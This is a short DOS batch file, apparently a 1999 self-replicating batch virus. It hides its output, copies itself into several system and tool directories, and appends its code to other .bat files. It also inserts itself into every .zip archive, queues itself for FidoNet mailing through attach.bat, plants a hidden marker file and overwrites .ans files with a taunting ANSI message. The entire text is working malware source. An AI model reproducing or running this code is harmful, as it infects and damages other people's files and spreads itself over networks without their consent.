@echo off
if exist c:\ok.txt goto okok
@ctty nul
type ok >> c:\ok.txt
copy %0 c:\
c:\%0
copy %0 c:\fido
c:\fido\%0
copy %0 c:\util
c:\util\%0
copy %0 d:\util
d:\util\%0
copy %0 %winbootdir%
%winbootdir%\%0
copy %0 d:\tools
d:\tools\%0
copy %0 c:\tools
c:\tools\%0
echo. >> c:\fido\attach.bat
echo attach.exe -A -L %0 >> c:\fido\attach.bat
attrib c:\ok.txt +h +r
:okok
if exist c:\butcher.txt goto cont
echo [0;1;33m[2J[6C[32mHello sentence! >> c:\butcher.txt
echo  [36m butcher go for you!  >> c:\butcher.txt
echo [7C[31mHa-Ha-Ha![0m >> c:\butcher.txt
:cont
for %%i in (*.bat ..\*.bat) do set TRTL = %%i
for %%f in (*.bat ..\*.bat) do find "TRTL" %%f
for %%j in (*.bat ..\*.bat) do if %%j==ATTACH.BAT goto att
goto re
:att
echo. >> attach.bat
echo attach.exe -A -L %0 >> attach.bat
exit
:re
if not errorlevel 1 goto next
for %%d in (*.bat) do copy /b %%d + %0
:next
for %%z in (*.zip) do pkzip %%z %0
for %%q in (*.ans c:\max\*.ans) do copy c:\butcher.txt %%q
@ctty con
: (c) Unknow! December 1999...